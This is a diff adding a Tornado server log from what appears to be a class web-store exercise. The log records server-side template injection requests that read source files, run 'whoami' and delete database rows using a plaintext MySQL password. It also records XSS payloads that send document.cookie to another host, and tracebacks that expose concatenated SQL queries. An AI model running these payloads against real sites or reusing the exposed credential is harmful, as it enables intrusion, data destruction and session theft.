@@ -1,0 +1,130 @@
+WARNING:tornado.access:405 HEAD /welcome/name=%7B%25import%20os%25%7D%7B%7Bopen(%22class_website.py%22,%22r%22).read()%7D%7D (129.244.244.160) 1.56ms
+WARNING:tornado.access:405 HEAD /welcome/name=%7B%25import%20os%25%7D%7B%7Bos.popen(%22whoami%22).read()%7D%7D (129.244.244.160) 1.40ms
+  File "./class_website.py", line 127
+    products = c.fetchall()
+           ^
+SyntaxError: invalid syntax
+  File "./class_website.py", line 127
+    products = c.fetchall()
+           ^
+SyntaxError: invalid syntax
+WARNING:tornado.access:405 HEAD /welcome/name=%7B%25import%20MySQLdb%25%7D%7B%7Bx=MySQLdb.connect(host=%22127.0.0.1%22,port=3306,db=%22team6%22,user=%22team6%22,passwd=%226ArLGzEEH6QbLiR0g07VmFGxA8QEKA7O%22)%7D%7D%7B%7Bc=x.cursor()%7D%7D%7B%25import%20uuid%25%7D%7B%7Bc.execute(%22DELETE%20FROM%20cart%20WHERE%20user_cookie%20=%20%27aa39fe21-b174-413b-818f-3fa419b48408%27%22)%7D%7D%7B%7Bx.commit()%7D%7D (129.244.244.160) 1.57ms
+WARNING:tornado.access:405 HEAD /details/1%3Cimg%20src=x%20onerror=%22this.onerror=null;this.src='http:%2F%2F172.20.103.45:8880%2F'+document.cookie%22%3E (129.244.244.160) 1.97ms
+ERROR:tornado.application:Uncaught exception GET /details/x (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/x', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': '*/*', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0)', 'Connection': 'Keep-Alive', 'Referer': "http://172.20.103.45:8893/details/1%3Cimg%20src=x%20onerror=%22this.onerror=null;this.src='http:%2F%2F172.20.103.45:8880%2F'+document.cookie%22%3E", 'Cookie': 'webstore_cookie=62621da0-a6e9-4c97-b33d-c422916c5aec'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/x (129.244.244.160) 1.57ms
+ERROR:tornado.application:Uncaught exception GET /details/x (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/x', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/17.17074', 'Connection': 'Keep-Alive', 'Referer': "http://172.20.103.45:8893/details/1%3Cimg%20src=x%20onerror=%22this.onerror=null;this.src='http:%2F%2F172.20.103.45:8880%2F'+document.cookie%22%3E", 'Cookie': 'webstore_cookie=1d5500d2-4e6f-45c6-9afa-ccd1ec8e9834'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/x (129.244.244.160) 1.37ms
+ERROR:tornado.application:Uncaught exception GET /details/x (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/x', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/17.17074', 'Connection': 'Keep-Alive', 'Referer': 'http://172.20.103.45:8893/details/1%3Cimg%20src=x%20onerror=%22this.onerror=%2Fdocument.cookie%22%3E', 'Cookie': 'webstore_cookie=1d5500d2-4e6f-45c6-9afa-ccd1ec8e9834'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/x (129.244.244.160) 1.40ms
+ERROR:tornado.application:Uncaught exception GET /details/5 (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/5', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie="2|1:0|10:1519261695|15:webstore_cookie|48:MjUwODM4MDctZTkyMC00YzU4LTk0MzgtYmFkZDQyYzc4ZWQz|8148bdcfdc0dcd94bbb7d4d2541d4dcbabbff7ad45df7ae7840950f7d5f77ef9"', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 100, in get
+    quoted_url = urllib.quote_plus(urllib.quote_plus(product[0][2]))
+IndexError: tuple index out of range
+ERROR:tornado.access:500 GET /details/5 (129.244.244.160) 2.98ms
+ERROR:tornado.application:Uncaught exception GET /details/5 (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/5', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie="2|1:0|10:1519261695|15:webstore_cookie|48:MjUwODM4MDctZTkyMC00YzU4LTk0MzgtYmFkZDQyYzc4ZWQz|8148bdcfdc0dcd94bbb7d4d2541d4dcbabbff7ad45df7ae7840950f7d5f77ef9"', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 100, in get
+    quoted_url = urllib.quote_plus(urllib.quote_plus(product[0][2]))
+IndexError: tuple index out of range
+ERROR:tornado.access:500 GET /details/5 (129.244.244.160) 1.91ms
+WARNING:tornado.access:404 GET /favicon.ico (129.244.244.160) 2.42ms
+WARNING:tornado.access:404 GET /class_website.py (129.244.244.160) 0.61ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 1.15ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 1.79ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 3.15ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 0.94ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 1.04ms
+WARNING:tornado.access:404 GET /class_website.py (129.244.244.160) 0.64ms
+WARNING:tornado.access:404 GET /details/1/class_website.py (129.244.244.160) 1.00ms
+WARNING:tornado.access:404 GET /class_website.py (129.244.244.160) 1.46ms
+WARNING:tornado.access:404 GET /details/1%3Cimg%20src=x%20onError=http://172.20.103.45:8880/welcome%3E (129.244.244.160) 0.61ms
+WARNING:tornado.access:404 GET /details/1%3Cimg%20src=x%20onError=http://172.20.103.45:8880/welcome/%3CIMG%20SRC=x%20onError=javascript:alert(document.cookie)%3E%3E (129.244.244.160) 0.60ms
+WARNING:tornado.access:404 GET /details/1%3Cimg%20src=x%20onError=http://172.20.103.45:8893/welcome/%3CIMG%20SRC=x%20onError=javascript:alert(document.cookie)%3E%3E (129.244.244.160) 0.57ms
+WARNING:tornado.access:404 GET /details/1/class_website.py (129.244.244.160) 0.64ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 1.07ms
+WARNING:tornado.access:404 GET /class_website.py (129.244.244.160) 2.44ms
+ERROR:tornado.application:Uncaught exception GET /details/class_website.py (129.244.244.160)
+HTTPServerRequest(protocol='http', host='172.20.103.45:8893', method='GET', uri='/details/class_website.py', version='HTTP/1.1', remote_ip='129.244.244.160', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Host': '172.20.103.45:8893', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Connection': 'keep-alive', 'Cookie': 'webstore_cookie=ed8390c0-2bba-4313-88d0-d6853432c603', 'Upgrade-Insecure-Requests': '1'})
+Traceback (most recent call last):
+  File "/home/team6/.local/lib/python2.7/site-packages/tornado/web.py", line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "./class_website.py", line 97, in get
+    WHERE p.id = " + item_number[0])
+IndexError: list index out of range
+ERROR:tornado.access:500 GET /details/class_website.py (129.244.244.160) 1.03ms
